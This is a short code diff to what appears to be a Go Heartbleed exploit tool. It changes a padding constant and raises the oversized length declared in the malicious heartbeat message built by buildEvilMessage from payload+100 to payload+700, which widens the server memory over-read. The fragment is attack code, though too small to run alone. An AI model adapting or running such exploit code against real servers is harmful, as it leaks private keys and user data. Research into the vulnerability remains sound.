@@ -11,7 +11,7 @@ import (
 
 var ErrPayloadNotFound = errors.New("heartbleed: payload not found")
 
-var padding = []byte("YELLOW SUBMARINE")
+var padding = []byte("Y7")
 
 // struct {
 //    uint8  type;
@@ -25,7 +25,7 @@ func buildEvilMessage(payload []byte) []byte {
 	if err != nil {
 		panic(err)
 	}
-	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
+	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+700))
 	if err != nil {
 		panic(err)
 	}
